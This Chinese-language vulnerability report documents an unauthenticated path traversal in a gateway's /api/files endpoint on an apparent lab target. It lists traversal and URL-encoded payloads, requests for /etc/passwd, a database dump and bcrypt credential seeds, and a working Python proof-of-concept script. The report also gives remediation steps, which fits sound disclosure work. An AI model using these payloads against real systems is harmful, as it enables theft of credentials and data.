# 未授权任意文件读取（路径穿越）在 /api/files 的 path 参数

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-10-31 07:32:53 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /api/files
**Method:** GET
**CWE:** CWE-22
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

网关的文件浏览接口 `/api/files` 直接使用 `path` 查询参数拼接文件系统路径，未做规范化与基目录限制，未授权访问者可通过 `../` 序列读取基目录之外的文件。实测可读取系统账户与主机标识、应用配置、备份与种子文件、部署脚本与 SSH 配置，并可通过接口自带的目录列举功能枚举文件系统（所读内容为仿真映射，见反证说明）。

## Impact

未认证攻击者可读取网关进程可访问的任意文件（仅受一份很小的文件名黑名单限制）。除 `/etc/passwd`、`/etc/hostname` 之外，已实测获取：应用配置（含数据库连接串与 NEX-4481 回归说明）、`/app/backups/` 与 `backups/` 目录下的配置归档与数据库快照文件名、`seeds/admin.bcrypt`、`seeds/devops.bcrypt`、`seeds/svc_nexus.bcrypt`、`/opt/nexus/scripts/backup.sh`（`pg_dump` 调用方式与备份落盘路径）、`/etc/ssh/sshd_config`（`PasswordAuthentication yes`）、`/etc/group`（`deploy` 属于 `sudo`、`docker` 组）、`/etc/fstab`（NFS 共享挂载）以及 `/var/log` 下的认证与访问日志。需要说明的是，读到的文件系统为仿真映射（`app.jar` 为 stub、日志为静态样例），备份与 seeds 文件内容为预置/合成数据，因此这些材料可用于暴露部署结构、内部路径与凭据形态，但不能据此声称已获取真实生产数据。攻击者无需任何凭据或交互。

## Counterevidence

主动排查并记录了限制：(1) 存在文件名黑名单，`/etc/shadow`、`/root/.ssh/id_rsa`、`/home/deploy/.ssh/id_rsa` 返回 403，`/proc/*` 返回 404，因此并非全盘任意读取；(2) 未发现写入或代码执行路径——`/api/files` 对 POST/PUT/PATCH 返回 405，`/api/bounty/submit` 不落盘，`/actuator/env` 只读，`/debug` 忽略 `cmd`/`exec` 参数，SQL 后端拒绝 `pg_read_file` 与 `COPY ... TO PROGRAM`；(3) 读到的文件系统为**仿真映射**：`app.jar` 仅 64 字节 stub、`/var/log/nginx/access.log` 为时间戳固定的静态样例日志、备份归档与 `seeds/*.bcrypt` 内容为预置/合成数据，且目录树为固定的裁剪集合，因此机密性损失集中在应用配置、部署脚本、主机元数据与预置凭据材料，而非线上全量数据。上述限制降低了上限但未否定漏洞：接口无认证、无基目录约束，`path` 参数确实被当作文件路径解析并返回基目录之外的内容，且存在 404 负面对照证明其非固定回放。

## What Would Change This Severity

若进一步证明可读取运行账户的私钥、vault 解密后的明文口令或云/K8s 凭据并用于横向移动，应上调至 Critical；若确认该环境为纯合成数据且不含任何真实凭据，则下调至 Medium。

## Technical Analysis

`/api/files` 在无任何认证信息的情况下返回虚拟文件树，并把 `path` 直接当作文件系统路径打开，没有做 canonicalpath 校验或基目录（`/app`）约束：

- `../../../../etc/passwd` → 200，返回完整 `/etc/passwd`
- `..%2f..%2f..%2f..%2fetc%2fpasswd`、`....//..%2f..//etc/passwd`、绝对路径 `/etc/passwd` → 均 200
- `../../config.yml`、`/etc/hostname` → 200
- 负面对照：`/nope_does_not_exist_12345` → 404，证明按真实文件系统解析而非固定回放

接口同时开启目录列举，可用于完整枚举：`path=/` 返回 `app/ bin/ etc/ home/ opt/ root/ usr/ var/`；`path=/var/log/` 返回 `auth.log nexus-gateway/ nexus-health.log nginx/ syslog`；`path=/app/backups/` 返回两个配置归档与一个数据库快照。

应用自身配置与运维笔记均确认这是已知未修复回归：

```yaml
gateway:
  version: 2.4.1
  filesModule:
    allowTraversal: false  # NEX-4481: regression, fixed in 2.4.2
```

```text
# deploy ops notes
- [ ] NEX-4481: files module traversal regression — fix queued for 2.4.2 prod rollout
```

已确认存在一份有限的文件名黑名单：`/etc/shadow`、`/root/.ssh/id_rsa`、`/home/deploy/.ssh/id_rsa` 返回 403 `Access denied`，`/proc/*` 返回 404。但该黑名单不覆盖配置、备份、种子文件与部署脚本，无法构成有效边界。未发现任何写入能力：`POST`/`PUT`/`PATCH /api/files` 均返回 405，`/api/bounty/submit` 不落盘，`/actuator/env` 为只读（POST 405）。

## Proof of Concept

1. 直接请求文件浏览接口获取基线文件树，确认接口无认证即可访问。
2. 在 `path` 参数中加入足够数量的 `../` 上跳至根目录，指向 `/etc/passwd`，响应体返回系统账户清单，HTTP 200。
3. 以 URL 编码形式（`%2f`）与绝对路径形式重复请求，确认编码/绝对路径变体均未被拦截。
4. 请求不存在的路径作为负面对照，确认返回 404，排除固定回放。
5. 请求 `path=/` 与 `path=/var/log/`，利用目录列举枚举文件系统与日志目录。
6. 请求 `path=/etc/hostname`、`path=config.yml` 验证可读取主机标识与应用配置。
7. 请求 `path=backups/db-snapshot-2026-10-13-f2ecc44d.sql.gz`，将响应体按 gzip 解压，得到含 `users` 表与 bcrypt 口令哈希的 PostgreSQL dump。
8. 请求 `path=seeds/admin.bcrypt`、`path=seeds/devops.bcrypt`、`path=seeds/svc_nexus.bcrypt`、`path=/opt/nexus/scripts/backup.sh`、`path=/etc/ssh/sshd_config`，获取初始凭据种子、备份脚本与 SSH 配置。

```python
#!/usr/bin/env python3
"""未授权任意文件读取 PoC — Nexus Gateway 2.4.1 /api/files"""
import gzip
import urllib.parse

import requests

BASE = "http://10.0.93.73:18080/api/files"


def read_file(path):
    r = requests.get(BASE, params={"path": path}, timeout=20)
    return r.status_code, r.content


# 1) 路径穿越读取系统文件
status, body = read_file("../../../../etc/passwd")
print(f"[+] /etc/passwd -> HTTP {status}")
print(body.decode("utf-8", "replace")[:300])

# 2) 负面对照
status, _ = read_file("/nope_does_not_exist_12345")
print(f"[-] 不存在的文件 -> HTTP {status} (预期 404)")

# 3) 主机标识与目录枚举
status, body = read_file("/etc/hostname")
print(f"[+] /etc/hostname -> HTTP {status}: {body.decode().strip()}")

for d in ("/", "/var/log/", "/app/backups/"):
    status, body = read_file(d)
    print(f"[+] 目录 {d} -> HTTP {status}: {body.decode('utf-8', 'replace')[:200]}")

# 4) 应用配置
status, body = read_file("config.yml")
print(f"[+] config.yml -> HTTP {status}")
print(body.decode("utf-8", "replace"))

# 5) 数据库备份（含 bcrypt 口令哈希）
status, body = read_file("backups/db-snapshot-2026-10-13-f2ecc44d.sql.gz")
print(f"[+] db snapshot -> HTTP {status} ({len(body)} bytes)")
if status == 200 and body[:2] == b"\x1f\x8b":
    print(gzip.decompress(body).decode("utf-8", "replace")[:1200])

# 6) 初始凭据种子与部署脚本
for p in ("seeds/admin.bcrypt", "seeds/devops.bcrypt", "seeds/svc_nexus.bcrypt",
          "/opt/nexus/scripts/backup.sh", "/etc/ssh/sshd_config"):
    status, body = read_file(p)
    print(f"[+] {p} -> HTTP {status}: {body.decode('utf-8', 'replace')[:300]}")

# 7) 编码变体
for variant in ("..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd",
                "....//..%2f..//etc/passwd"):
    url = f"{BASE}?path={urllib.parse.quote(variant, safe='')}"
    r = requests.get(url, timeout=20)
    print(f"[+] 变体 {variant!r} -> HTTP {r.status_code} ({len(r.content)} bytes)")
```

## Remediation

1. 在 `files` 模块中先对 `path` 做规范化（`Path.normalize()` / `File.getCanonicalPath()`），再强制校验结果必须位于声明的基目录（如 `/app`）之内，否则返回 403。
2. 拒绝任何包含 `..` 段的输入，并在解码之后（而非之前）做校验，防止 `%2f`、双重编码绕过。
3. 使用白名单方式暴露文件：维护允许读取的文件清单或按相对 ID 映射到固定文件，避免把用户输入直接当路径。
4. 立即升级到声明修复该回归的 2.4.2 及之后版本，并在持续集成中加入路径穿越回归测试。
5. 将 `allowTraversal` 等安全开关改为默认拒绝失败（fail-closed），配置解析失败时不得放开限制。

## Assumptions

攻击者仅需能访问 `10.0.93.73:18080`，无需任何凭据或会话。默认进程以非 root 身份运行，因此读取范围受进程权限限制（实测可读 `/etc/passwd`，说明具有普通用户权限即可）。
